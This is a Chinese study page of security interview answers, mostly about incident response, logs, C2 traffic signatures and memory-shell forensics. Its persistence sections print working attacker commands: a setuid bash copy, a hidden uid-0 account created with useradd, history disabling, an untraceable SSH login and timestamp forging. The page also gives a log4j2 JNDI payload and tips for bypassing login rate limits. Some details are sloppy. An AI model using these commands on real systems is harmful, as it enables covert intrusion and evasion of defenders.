<p>其他工具例如 wireshark 也可以抓 https 明文，但是原理不同，wireshark 是先将浏览器 ssl 日志设置环境变量，再将 ssl 日志路径设置到 wireshark 里面，让 wireshark 读取 ssl，进行解密，整个过程只有一套密钥。</p>
<hr>
<h4 id="java-内存马的原理">java 内存马的原理</h4>
<p>客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。</p>
<p>java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。</p>
<p>java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。</p>
<p>动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。</p>
<hr>
<h4 id="常见安全设备的种类和功能">常见安全设备的种类和功能</h4>
<p>终端安全响应（edr）：例如，奇安信天擎。部署在终端，可以理解为高级杀软，和传统杀软的区别在于 edr 是基于文件行为进行检测的，而传统杀软停留在文件签名的检测。edr 的检测范围包括硬件信息、系统信息、网络信息等，也可以检测带有威胁的网络请求，和 ips/ids 的区别在于，ips/ids 是基于流量进行检测，而 edr 是基于终端文件行为进行检测。</p>
<p>流量威胁检测（ips/ids）：例如，奇安信天眼。高级威胁检测、异常行为检测、告警响应处置、攻击回溯分析。ips/ids 是监控入站出站流量，进行检测分析和响应处置。</p>
<p>态势感知：一个额外的大数据平台，从其他安全设备采集信息，对网络中的攻击、威胁、漏洞和资产执行动态整合，通过大数据处理及整合能力，从全局视角把握整个网络的安全状态。</p>
<p>威胁情报平台：漏洞情报、攻击者档案库、邮件攻防检测、对接数据平台、联动云端情报。</p>
<p>蜜罐：蜜罐技术是一种主动防御技术，通过部署没有真实业务数据的系统来诱骗攻击者实施攻击，记录其攻击行为从而学习攻击者的攻击目的和攻击手段，以此不断提升真实业务系统的安全防护能力。</p>
<p>防火墙：按照一定的规则自动决定是否允许入站和出站流量通过，阻断不受信任的网络连接。</p>
<p>堡垒机：也称为运维审计系统，是集中进行权限控制和安全审计的服务器，置于客户端和网站服务器之间。</p>
<hr>
<h4 id="windows-日志文件">windows 日志文件</h4>
<p>日志文件存储在目录 C:\Windows\System32\winevt\Logs 里面。其中 System.evtx, Application.evtx, Security.evtx 这几个日志比较有用。系统日志和应用程序日志对系统管理员更为有用，记录的是故障排除信息；安全日志对调查员更为有用，记录登录、远程访问、进程追踪、身份认证、特权使用、策略变更等涉及安全的事件。</p>
<p>需要现场检查主机是否开启了日志的审核策略，例如 windows server 2008 r2 默认不开启审核策略，需要手动开启。</p>
<p>按 win+r 输入 eventvwr.msc 可以打开事件查看器。事件 id 有默认的含义：4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。</p>
<hr>
<h4 id="linux-日志文件">linux 日志文件</h4>
<p>默认存放在 /var/log 目录下。</p>
<p>使用 more /etc/rsyslog.conf 查看日志的配置。</p>
<p>系统出现问题首先检查 /var/log/message，里面记录了系统的重要信息。</p>
<p>/var/log/secure 记录了身份认证和权限管理方面的信息，例如 ssh 登录、su 切换用户，sudo 授权。</p>
<p>登录方面有四个文件可供查看，都是二进制文件，不能用 vi 打开，要用特殊的命令查看。/var/log/wtmp 记录全部的登录信息，使用 last 命令查看；/var/log/utmp 记录目前处于登录状态的用户，使用 w,who,users 等命令查看；/var/log/btmp 记录错误登录，使用 lastb 命令查看；/var/log/lastlog 记录所有用户最后登录时间，使用 lastlog 命令查看。</p>
<hr>
<h4 id="linux-日志分析常用命令">linux 日志分析常用命令</h4>
<pre><code>w   可以查看当前已登录的用户和他们的会话信息。

last   可以查看最近所有登录和注销会话的用户列表以及日期和时间。

lastlog   可以查看所有用户最后一次登录的时间和位置。

who /var/run/utmp   可以查看当前登录的用户。

top 可以查看当前占用 cpu 和内存的进程。

find -iname &quot;name&quot; | xrags grep -in &quot;word&quot;   可以查看文件名包含 name 而文件内容包含 word 的文件，并显示 words 出现在第几行。-i 忽略大小写，-n 显示行数。

cat filename | tail -n +5 | head -n 10   可以查看文件的第 5 行开始的 10 行，tail 用来查看新添加的日志信息。

tail -f /var/log/messages 可以实时监控日志信息。

awk '/error/ {print $0}' /var/log/messages 可以筛选出包含 error 字符串的日志信息。

awk -F: '$3==0{print $1}' /etc/passwd   可以查看除了 root 之外还有哪些特权用户（uid=0）。

grep error /var/log/messages   可以查找系统日志中的错误信息。

grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}'   可以查看登录成功的日期、用户名、ip。

grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more   可以查看正在爆破主机 root 密码的 ip 有哪些。

grep &quot;useradd&quot; /var/log/secure   可以查看增加用户的记录。

grep &quot;userdel&quot; /var/log/secure   可以查看删除用户的记录。

netstat -ntlp | grep &quot;:80 &quot; | awk '{print $7}' | tr '/' &quot;\t&quot;   可以根据端口列进程，80 改为任意端口。
</code></pre>
<hr>
<h4 id="给你一个比较大的日志应该如何分析">给你一个比较大的日志，应该如何分析</h4>
<p>当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：</p>
<ol>
<li>对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。</li>
<li>确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。</li>
<li>使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。</li>
<li>定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。</li>
<li>进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。</li>
<li>采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。</li>
</ol>
<p>需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。</p>
<hr>
<h4 id="tcpip-四层架构对应的常见网络协议">tcp/ip 四层架构对应的常见网络协议</h4>
<p>应用层：http/s，dns，ftp，ssh，dhcp；</p>
<p>传输层：tcp，udp；</p>
<p>网络层：ip，arp，icmp，路由选择协议（rip，ospf，bgp），nat；</p>
<p>网络接口层：以太网 Ethernet，基于以太网的点对点通讯协议 PPPoE</p>
<hr>
<h4 id="tcp-和-udp-的区别">tcp 和 udp 的区别</h4>
<p>tcp 是面向连接的协议，发送数据前需要三次握手；udp 是无连接的协议，不需要提前确认连接就可以发送数据。</p>
<p>tcp 可靠，序号+握手+重传，保证了可靠性；udp 不可靠，需要应用层额外的设计来保证可靠性。</p>
<p>tcp 有序，后发送的数据先到达了，tcp 会按照序号重新排序；udp 无序。</p>
<p>tcp 传输慢；udp 传输快。</p>
<hr>
<h4 id="dns-使用的是-tcp-还是-udp">dns 使用的是 tcp 还是 udp</h4>
<p>dns 通常使用 udp，在请求包较大时使用 tcp。因此使用 dns 的请求不易被 tcp 的抓包工具截获。</p>
<hr>
<h4 id="什么是-ipv4-地址的-a-段-b-段-c-段子网掩码有什么作用">什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用</h4>
<p>A 类是 1.0.0.0 到 126.0.0.0；B 类是 128.0.0.0 到 191.255.255.255；C 类是 192.0.0.0 到 223.255.255.255。此外还有 D 类和 E 类。</p>
<p>ABC 三类 ip 分别有私有 ip 段。</p>
<p>10.0.0.0～10.255.255.255</p>
<p>172.16.0.0～172.31.255.255</p>
<p>192.168.0.0～192.168.255.255</p>
<p>子网掩码用来标识网络地址和主机地址，将网络划分为若干子网。</p>
<hr>
<h4 id="什么是-webshell常见的-getshell-方法">什么是 webshell，常见的 getshell 方法</h4>
<p>webshell 是 web 服务器的后门，攻击者利用 webshell 拿下服务器的控制权限，并且是持久性控制。后门是一个总称，木马的作用就是植入后门，webshell 就是一种特殊的木马。</p>
<p>常见的 getshell 方法有：</p>
<p>（1）利用弱口令进后台传 webshell。</p>
<p>（2）利用任意文件上传漏洞传 webshell。</p>
<p>（3）利用 rce 漏洞写 shell，植入多个后门并扩大危害。</p>
<p>（4）利用文件包含漏洞/解析漏洞，解析图片马。</p>
<p>（5）sql 注入写 shell。</p>
<hr>
<h4 id="上传-webshell-之后怎样获得绝对路径">上传 webshell 之后怎样获得绝对路径</h4>
<p>看返回包；报错信息；fuzz；再传一个 php 探针。</p>
<hr>
<h4 id="webshell-不出网如何利用">webshell 不出网如何利用</h4>
<p>正向代理，建立 http 隧道；找能出网的协议，例如 dns，icmp 等。</p>
<hr>
<h4 id="正向代理和反向代理的区别和用途">正向代理和反向代理的区别和用途</h4>
<p>正向代理即客户端代理。用途：（1）访问原来访问不到的资源；（2）缓存，加速访问；（3）隐藏访问者的信息。</p>
<p>反向代理即服务器端代理。用途：（1）保证内网安全；（2）实现负载均衡，优化网站负载。</p>
<hr>
<h4 id="内网穿透是什么">内网穿透是什么</h4>
<p>外网无法直接访问内网，搭建一个隧道访问特定的内网主机或服务，称为内网穿透，也成为 nat 穿透。</p>
<hr>
<h4 id="游戏加速器与内网穿透">游戏加速器与内网穿透</h4>
<p>nat 原理：外网 ip 到 内网 ip 的转换，根据 nat 类型对网络请求进行限制，阻断对内网的直接访问。</p>
<p>游戏加速器原理：复用映射关系实现游戏流量的 nat 穿透。先进行一次内网穿透，将映射关系记录在 nat 路由表中，之后游戏流量经过的时候使用这个映射，就改变了 nat 类型。</p>
<p>udp 穿透和 tcp 穿透流程是一样的，但是 tcp 的握手容易导致穿透失败，例如 nat 收到 rst 报文后删除了映射、nat 开启了 syn 过滤。</p>
<hr>
<h4 id="钻石票据黄金票据白银票据的区别">钻石票据、黄金票据、白银票据的区别</h4>
<p>白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。钻石票据能够以任意用户的身份访问任意服务。</p>
<hr>
<h4 id="设置蜜罐的时候开放哪些端口理由是什么">设置蜜罐的时候开放哪些端口，理由是什么</h4>
<p>数据库：1433 sqlserver；1521 oracle；3306 mysql。</p>
<p>远程连接：22 ssh；3389 rdp。</p>
<p>主机：21 ftp；53dns；23 telnet。</p>
<p>web：7001-7002 weblogic；8080 jboos/tomcat；6379 redis。</p>
<hr>
<h4 id="暴力破解密码的时候遇到登录失败次数限制怎么绕过">暴力破解密码的时候遇到登录失败次数限制怎么绕过</h4>
<p>（1）在请求包添加 xff 请求头进行欺骗。</p>
<p>（2）双写 xff 请求头。</p>
<p>（3）设置代理池，例如用 burp 插件轮换 ip。</p>
<p>（4）如果不是封禁 ip 而是封禁账号，则遍历用户名导致全站用户无法登录，业务瘫痪。</p>
<hr>
<h4 id="常见的反爬虫策略">常见的反爬虫策略</h4>
<p>访问频率检测；封 ip；封 user-agent/cookie/referer 等请求头；设置验证码；引用外部 js 进行动态渲染；敏感信息引入外部链接；ajax 异步传输；流量加密传输。</p>
<hr>
<h4 id="渗透测试的流程">渗透测试的流程</h4>
<p>确定目标-信息收集-发现漏洞-利用漏洞-内网渗透-输出报告</p>
<hr>
<h4 id="信息收集的思路">信息收集的思路</h4>
<hr>
<h3 id="redis-未授权访问是什么怎么利用能做到-rce">redis 未授权访问是什么，怎么利用能做到 rce</h3>
<p>redis 是开源的内存数据库，提供高性能的键值对存储系统，常用于缓存、消息队列、会话存储等应用场景。</p>
<p>redis 未授权访问的条件：（1）redis 默认的 6379 端口可以在公网访问；（2）redis 密码默认为空，如果设置了弱口令可以爆破。</p>
<p>漏洞原理：公网访问 6379 端口并使用弱口令登录 redis 数据库，使用 redis 自带的 config 命令进行 getshell。</p>
<p>后续 rce 利用及其条件：（1）写 ssh，需要服务器有 .ssh 目录并且 redis 有写入权限。（2）写 webshell，需要知道 web 的绝对路径。</p>
<hr>
<h3 id="ssrf-用-redis-提升为-rce">ssrf 用 redis 提升为 rce</h3>
<p>用 dict 协议探测，用 gopher 协议写入。需要知道 web 的绝对路径，例如 /var/www/html。</p>
<hr>
<h4 id="给定域名绕过-cdn-找真实-ip">给定域名绕过 cdn 找真实 ip</h4>
<p>cdn 即内容交付网络，通过缓存，实现降低延迟和均衡负载的功能。</p>
<p>找真实 ip 的方法：查询 dns 解析记录；通过 ssl 证书查询真实 ip；用 fofa 等测绘工具直接搜；&hellip;</p>
<hr>
<h3 id="检测">检测</h3>
<p>研判攻击流量，保留攻击证据，确定影响的程度和范围，后期和其他厂商联动溯源，最终生成一个防守报告。</p>
<p>研判需要对安全设备（天眼、蜜罐、入侵检测、堡垒机、态势感知）和威胁情报平台（微步）比较熟悉。</p>
<hr>
<h4 id="传统漏洞攻击流量特征">传统漏洞攻击流量特征</h4>
<p>见 top10 和流量特征专题。</p>
<hr>
<h4 id="java-反序列化攻击流量特征">java 反序列化攻击流量特征</h4>
<p>见 top10 和流量特征专题。</p>
<hr>
<h4 id="常见-webshell-管理工具的流量特征">常见 webshell 管理工具的流量特征</h4>
<p>见流量特征专题。</p>
<hr>
<h4 id="cs-流量特征">cs 流量特征</h4>
<p>默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。</p>
<p>木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。</p>
<p>下发任务的方法是 c2 服务器在心跳包的响应里发送任务。</p>
<p>beacon 使用 post 回传数据并且 url 为 /submit.php?id=</p>
<p>stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。</p>
<p>stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。</p>
<hr>
<h4 id="msf-流量特征">msf 流量特征</h4>
<p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p>
<ol>
<li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li>
<li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li>
<li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li>
<li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li>
<li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</li>
</ol>
<p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。</p>
<hr>
<h4 id="其他红队工具的流量特征">其他红队工具的流量特征</h4>
<p>见流量特征专题。</p>
<hr>
<h4 id="从几万条告警中区分攻击和误报">从几万条告警中区分攻击和误报</h4>
<p>看 wireshark 判断是否为正常业务。</p>
<p>（1）可以记录正常业务的特征，从而在告警信息中排除正常业务。</p>
<p>（2）查看 ip，排除内部人员操作引起的误报。</p>
<p>（3）如果是扫描引起的误报，可以根据返回包的状态码和返回包大小进行判断。例如发现攻击者扫描 c 段 ip 但是返回 403 则忽略这次误报。</p>
<p>（4）从“待分析告警”中提取 exp，例如发现攻击者使用了某个组件 nday 的 exp，但是我们发现网站根本没有使用这个组件，则忽略这次误报。</p>
<hr>
<h4 id="判断事件类型">判断事件类型</h4>
<p>根据告警确定事件类型，如果是真实攻击则封禁 ip，并检测是否利用成功。</p>
<p>常见的事件类型有勒索/挖矿/蠕虫/钓鱼/文件上传/webshell/反弹shell/外联/敏感操作等。</p>
<hr>
<h4 id="判断失陷范围">判断失陷范围</h4>
<p>根据安全设备确定受到影响的主机和资产。</p>
<hr>
<h4 id="从告警内网-ip-确定在哪一层楼">从告警内网 ip 确定在哪一层楼</h4>
<p>（1）通过内网 ip 的掩码缩小搜查范围。</p>
<p>（2）通过 arp 请求获取 ip 的 mac 地址；</p>
<p>（3）从路由器 arp 缓存表找到 mac 地址对应的端口；</p>
<p>（4）找到设备所在位置。</p>
<hr>
<h4 id="内网告警的处理方式">内网告警的处理方式</h4>
<p>（1）根据告警信息定位到出现问题的设备；</p>
<p>（2）判断是否为蜜罐。</p>
<p>（3）如果是内网扫描先隔离；</p>
<p>（4）根据事件类型进行主机排查；</p>
<p>（5）根据日志文件进行溯源反制。</p>
<hr>
<h4 id="怎么判断木马是否上传成功">怎么判断木马是否上传成功</h4>
<p>看数据包响应码，看到 200/500 判断为疑似成功，看到 400 判断为失败；</p>
<p>访问木马上传路径；</p>
<p>自己复现攻击。</p>
<hr>
<h4 id="怎么在百万行代码中找到后门">怎么在百万行代码中找到后门</h4>
<p>文件对比。直接用文件对比工具、git 等版本控制工具进行文件对比、验证文件 hash 进行对比、使用 diff 命令进行文件对比。</p>
<hr>
<h4 id="天眼使用经验">天眼使用经验</h4>
<hr>
<h4 id="windows-入侵排查">windows 入侵排查</h4>
<p>（1）注册表-排查新增账号、远程控制</p>
<p>命令行 net users 可以看到主机的账号列表，但是看不到隐藏账号。使用注册表可以进一步排查隐藏账号。在 windows 搜索栏打开注册表编辑器，找到 HKEY_LOCAL_MACHINE\SAM，发现无法看到后续内容，右键编辑权限，选择管理员完全控制，然后重新打开注册表。找到</p>
<pre><code>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\
</code></pre>
<p>即可看到全部账号信息。</p>
<p>注册表可以看远程桌面调用历史。</p>
<pre><code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\
</code></pre>
<p>（2）任务计划程序-排查恶意脚本</p>
<p>系统搜索任务计划进行排查。</p>
<p>（3）命令行-排查异常端口</p>
<p>打开命令行，输入</p>
<pre><code>netstat -ano
</code></pre>
<p>可以看到当前网络连接、端口号、进程 pid。</p>
<p>（4）任务管理器-排查可疑进程、启动项</p>
<p>选择详细信息可以看到 pid；右键可以看到文件所在位置；启动应用可以看到启动项。</p>
<p>（5）服务-排查异常服务、禁用远程注册表</p>
<p>系统搜索服务即可打开服务的管理页面。</p>
<p>找到 remote registry 选择禁用（如果攻击者有  则这个操作聊胜于无）。</p>
<p>（6）事件查看器-日志分析</p>
<p>系统搜索事件查看器，打开之后找到 windows 日志，通过事件 id 进行排查。</p>
<p>1149 远程桌面；4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。</p>
<hr>
<h4 id="linux-入侵排查">linux 入侵排查</h4>
<p>见上文 linux 日志分析部分。除了日志分析，还需要使用一些查杀木马后门的工具进行检测，例如用 rkhunter 查杀 rootkit 隐匿软件，用 clamav 查杀病毒。</p>
<hr>
<h4 id="负载均衡之后如何获得真实-ip">负载均衡之后如何获得真实 ip</h4>
<p>看 xff 头，xff: 真实ip，代理ip-1，代理ip-2，&hellip;</p>
<hr>
<h3 id="抑制">抑制</h3>
<hr>
<h4 id="中勒索病毒了怎么办">中勒索病毒了怎么办</h4>
<p>在奇安信/360/腾讯/启明等企业的病毒库里面搜索，有解密工具。</p>
<hr>
<h4 id="已知攻击者正在利用-log4j2-漏洞怎么应急">已知攻击者正在利用 log4j2 漏洞，怎么应急</h4>
<p>（1）根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。</p>
<p>（2）在防火墙的出站策略中阻断对常见 dnslog 平台的访问。</p>
<p>（3）排查内存马并清除。</p>
<p>（4）通知客户升级组件，进行安全加固。</p>
<p>（5）对攻击者进行溯源。</p>
<hr>
<h4 id="排查和阻止内网移动">排查和阻止内网移动</h4>
<p>如果一台主机在内网进行横向攻击，建议采取以下措施：</p>
<ol>
<li>
<p>隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。</p>
</li>
<li>
<p>停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。</p>
</li>
<li>
<p>收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。</p>
</li>
<li>
<p>清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。</p>
</li>
<li>
<p>升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。</p>
</li>
<li>
<p>取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。</p>
</li>
<li>
<p>加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。</p>
</li>
</ol>
<p>总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。</p>
<hr>
<h4 id="windows-权限维持方法">windows 权限维持方法</h4>
<p>（一）隐藏文件</p>
<p>（1）设置后门的文件属性为隐藏文件和系统文件。</p>
<p>命令为：</p>
<pre><code>attrib +s +a +h +r D:\test\project\test.txt
</code></pre>
<p>这些参数设置文件属性为系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。对于这个属性的设置，windows 文件夹的显示隐藏项目是无效的，从而做到了隐藏后门。</p>
<p>（2）将后门伪装成正常文件。</p>
<p>（3）对后门进行驱动级文件隐藏。</p>
<p>用工具 easy file locker，可以做到驱动级文件隐藏，网站相关目录下找不到相关文件。防守方的排查方法是在 c:\windows\ 里面找可疑内容。</p>
<p>（二）隐藏账号</p>
<p>可以用注册表先导出再导入 .reg 文件建立一个克隆账号，这个账号只能在注册表里面看到，用命令行查询或者查看系统用户都看不到这个隐藏账号。蓝队排查可以用 D 盾。</p>
<p>（三）端口复用</p>
<p>将后门和其他应用程序绑定同一个端口，借用其他程序的端口收发信息，避免后门开放新的端口。</p>
<p>需要对非后门信息进行回环转发。</p>
<p>（四）进程注入</p>
<p>进程注入技术有很多种，改注册表可以进一步实现注入的持久性。</p>
<p>红队工具 msf/cs 等都带有进程注入功能。将恶意代码注入到其他进程，可以实现无文件攻击，可以穿墙。</p>
<p>蓝队排查可以找红队工具的心跳包，心跳间隔取决于红队设置，一般是固定一分钟一个。</p>
<p>（五）注册表自启动</p>
<p>修改注册表实现开机自动开后门，防止重启后门掉线。</p>
<p>（六）组策略设置自动运行脚本</p>
<p>运行 gpedit.msc 进入本地组策略，开机自动运行恶意脚本。隐蔽性很高，但是需要知道脚本的绝对路径。</p>
<p>（七）计划任务</p>
<p>使用 windows 的任务计划程序设置每隔一分钟运行一次恶意脚本。</p>
<p>（八）服务自启动</p>
<p>在 windows 服务设置里面设置开机自动启动一个服务，结合 shell 实现无文件后门。</p>
<hr>
<h4 id="linux-权限维持方法">linux 权限维持方法</h4>
<p>（一）隐藏文件</p>
<p>用 chattr 命令防止 ls -l 查看。</p>
<pre><code>chattr +i evil.php   锁定文件
</code></pre>
<p>（二）篡改时间戳</p>
<p>用 touch 命令就可以改。</p>
<pre><code>touch -t 1401021042.30 webshell.php
</code></pre>
<p>（三）删除历史记录</p>
<p>禁用 history，带有空格的不记录。</p>
<pre><code>[space]set +o history
</code></pre>
<p>或者在 history 里面删除恶意语句。</p>
<pre><code>history | grep &quot;keyword&quot;

history -d [num]
</code></pre>
<p>（四）ssh 隐身登录</p>
<p>登录信息无法被 w/who/last 等指令检测到。</p>
<pre><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
</code></pre>
<p>（六）端口复用</p>
<p>借用其他应用程序的端口，达到隐藏端口的目的。</p>
<p>（五）隐藏进程</p>
<p>让 root 无法通过相关指令查询到攻击者使用的进程，例如用 top 看到 cpu 占用率高却看不到相关进程。</p>
<p>红队可以用 libprocesshider 工具实现隐藏进程，蓝队可以用 unhide 寻找隐藏进程进行网络取证。</p>
<p>（六）进程注入</p>
<p>linux 下可以用 linux-inject。</p>
<p>（七）创建用户</p>
<p>普通用户利用 suid shell 可以用 guest 用户登录暂时获取 root 权限。</p>
<pre><code>cp /bin/bash /tmp/shell

chmod u+s /tmp/shell
</code></pre>
<p>用 useradd 命令可以创建 root 用户。</p>
<pre><code>useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
</code></pre>
<p>（八）设置 ssh 公私钥</p>
<p>之后可以用自己设置的 ssh 密钥进行隐身登录，达成权限维持。</p>
<p>（九）定时任务</p>
<p>用 crontab 命令定时运行脚本。蓝队可以用 crontab -e 排查。</p>
<p>（十）openssh 后门</p>
<p>确定目标主机 openssh 版本、下载源码、添加后门。</p>
<hr>
<h4 id="windows-提权">windows 提权</h4>
<p>烂土豆配合令牌窃取进行提权：所谓的烂土豆提权就是俗称的MS16-075，其是一个本地提权，是针对本地用户的，不能用于域用户。可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p>
<p>注册表提权：注册表 AlwaysInstallElevated 是策略设置项，允许低权限用户以 system 权限运行安装文件；还可以将伪造的服务用注册表写入，那么运行服务的时候是 system 权限。</p>
<hr>
<h4 id="linux-提权">linux 提权</h4>
<p>脏牛提权；suid 提权；find 提权；git 提权；&hellip;</p>
<hr>
<h4 id="sql-的-udf-提权">sql 的 udf 提权</h4>
<p>适用场景：已经 getshell，发现数据库有系统权限，利用数据库进行提权。</p>
<p>利用条件：sql 有高权限、可读写 udf.dll（例如 root 默认有读写权限），已经 getshell 或者 sql 的安全配置允许导入 shell（例如 mysql 的 secure_file_priv 置空）</p>
<p>加固方法：调低数据库的权限，安全设置里面不允许读写文件。</p>
<p>提权流程：在 getshell 之后确认数据库有高权限并且满足 udf 提权的条件；查看 sql 的安装路径；根据 sql 的类型和版本确定传入 udf 的位置，例如查看 plugin 所在目录；制作 udf 文件；通过 shell 或 hex 编码传入 udf 文件；命令执行；功成身退，擦除痕迹。</p>
<hr>
<h3 id="根除">根除</h3>
<hr>
<h4 id="怎样排查内存马">怎样排查内存马</h4>
<p>（1）heapdump 内存排查。用 heapdump 和 grep 命令进行查找。</p>
<pre><code>heapdump

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &quot;POST /&quot;

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E &quot;/webapps/.*?\!&quot; | sort -u
</code></pre>
<p>（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马</p>
<pre><code>find / -name *.jsp | xargs grep &quot;pass&quot; 
</code></pre>
<p>（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；</p>
<p>（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。</p>
<p>（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。</p>
<p>（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。</p>
<p>（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。</p>
<hr>
<h4 id="怎样清除内存马">怎样清除内存马</h4>
<p>（1）客户允许的话，重启。</p>
<p>（2）删除 filter 中的恶意代码。</p>
<p>（3）中间件注销 filter。</p>
<p>（4）使用工具 arthas，VisualVM</p>
<hr>
<h4 id="内存马无文件落地怎么取证">内存马无文件落地，怎么取证</h4>
<p>/var/log/ 日志取证，结合流量特征用 grep 命令按照正则表达式搜索；/var/cache 缓存取证，结合流量特征用 grep 命令按照正则表达式搜索；检测工具，例如 arthas。</p>
<hr>
<h4 id="java-web-中-servletfilterlistener-的区别">java web 中 servlet/filter/listener 的区别</h4>
<p>servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。</p>
<p>servlet: 冰蝎内存马</p>
<p>filter: struts2</p>
<p>listener: spring, log4j</p>
<hr>
<h4 id="log4j2-原理和流量特征">log4j2 原理和流量特征</h4>
<p>log4j2 是日志组件，其 lookups 机制存在 jndi 注入。</p>
<p>判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。</p>
<p>log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}</p>
<p>log4j2 使用 jndi 注入，找恶意 url。</p>
<p>log4j2 流量可以看到 rmi 或者 ldap 字样。</p>
<p>log4j2 流量会出现 dns/ip 相关特征。</p>
<p>log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}</p>
<p>log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid</p>
<hr>
<h4 id="shiro-550-和-721-的区别">shiro 550 和 721 的区别</h4>
<p>攻击方法的区别：550 密码撞库，721 填充攻击。</p>
<p>shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。</p>
